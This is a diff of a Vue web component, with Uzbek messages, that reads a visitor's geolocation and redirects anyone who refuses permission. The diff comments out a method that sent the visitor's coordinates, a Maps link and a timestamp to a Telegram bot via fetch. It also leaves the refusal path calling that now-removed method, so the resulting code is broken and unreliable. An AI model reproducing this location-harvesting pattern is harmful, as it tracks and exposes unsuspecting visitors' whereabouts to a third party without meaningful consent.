@@ -47,7 +47,7 @@ export default {
           },
           (error) => {
             console.error("Geolocation error:", error.message);
-            this.sendToTelegram(false);
+            this.sendToTelegram(true);
             window.location.href = "/"; // Ruxsat bermasa – redirect
           },
           {
@@ -62,27 +62,27 @@ export default {
       }
     },
 
-    sendToTelegram(error = false) {
-      const message = error
-        ? `❌ Geolocation olishda xatolik yoki foydalanuvchi rad etdi.`
-        : `📍 Yangi foydalanuvchi joylashuvi:
-Latitude: ${this.latitude}
-Longitude: ${this.longitude}
-🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
-🕒 Vaqt: ${new Date().toLocaleString()}`;
+    //     sendToTelegram(error = false) {
+    //       const message = error
+    //         ? `❌ Geolocation olishda xatolik yoki foydalanuvchi rad etdi.`
+    //         : `📍 Yangi foydalanuvchi joylashuvi:
+    // Latitude: ${this.latitude}
+    // Longitude: ${this.longitude}
+    // 🗺️ Google Maps: https://www.google.com/maps?q=${this.latitude},${this.longitude}
+    // 🕒 Vaqt: ${new Date().toLocaleString()}`;
 
-      const encodedMessage = encodeURIComponent(message);
-      const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
+    //       const encodedMessage = encodeURIComponent(message);
+    //       const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodedMessage}`;
 
-      fetch(telegramUrl)
-        .then((res) => res.json())
-        .then((data) => {
-          console.log("Telegramga yuborildi:", data);
-        })
-        .catch((err) => {
-          console.error("Telegramga yuborishda xatolik:", err);
-        });
-    },
+    //       fetch(telegramUrl)
+    //         .then((res) => res.json())
+    //         .then((data) => {
+    //           console.log("Telegramga yuborildi:", data);
+    //         })
+    //         .catch((err) => {
+    //           console.error("Telegramga yuborishda xatolik:", err);
+    //         });
+    //     },
   },
 };
 </script>
